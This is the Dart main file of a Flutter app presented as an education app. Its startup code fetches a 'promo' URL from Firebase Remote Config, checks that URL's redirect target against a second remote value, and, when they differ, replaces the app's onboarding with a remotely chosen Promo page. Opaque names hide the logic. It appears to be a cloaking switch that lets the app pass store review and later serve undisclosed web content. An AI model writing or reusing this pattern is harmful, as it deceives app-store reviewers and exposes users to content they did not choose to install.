import 'dart:io';

import 'package:education_app/util/app_routes.dart';
import 'package:education_app/util/shared_pref_service.dart';
import 'package:education_app/views/onboarding/view/onboarding_screen.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:in_app_review/in_app_review.dart';
import 'consts/app_notification.dart';
import 'consts/config.dart';
import 'data/repository/onboarding_repository.dart';
import 'views/home/views/home_screen.dart';

late SharedPreferences prefs;
final rate = InAppReview.instance;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: Config.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NotificationApp().activate();
  await review();
  prefs = await SharedPreferences.getInstance();

  runApp(MyApp());
}

String promo = '';

Future<void> review() async {
  await vote();
  bool kxa = prefs.getBool('tsx') ?? false;
  if (!kxa) {
    if (await rate.isAvailable()) {
      rate.requestReview();
      await prefs.setBool('tsx', true);
    }
  }
}

Future<void> vote() async {
  prefs = await SharedPreferences.getInstance();
}

Future<bool> promosx() async {
  final remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetchAndActivate();
  String value = remoteConfig.getString('promo');
  String exampleValue = remoteConfig.getString('promoFed');
  final client = HttpClient();
  var uri = Uri.parse(value);
  var request = await client.getUrl(uri);
  request.followRedirects = false;
  var response = await request.close();
  if (!value.contains('nullPromos')) {
    if (response.headers.value(HttpHeaders.locationHeader).toString() !=
        exampleValue) {
      promo = value;
      return true;
    }
  }
  return false;
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.deepPurple),
      home: FutureBuilder<bool>(
        future: promosx(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              body: Center(
                child: CircularProgressIndicator(),
              ),
            );
          }
          if (snapshot.data == true && promo != '') {
            return Promo(promox: promo);
          } else {
            return const OnboardingScreen();
          }
        },
      ),
    );
  }
}
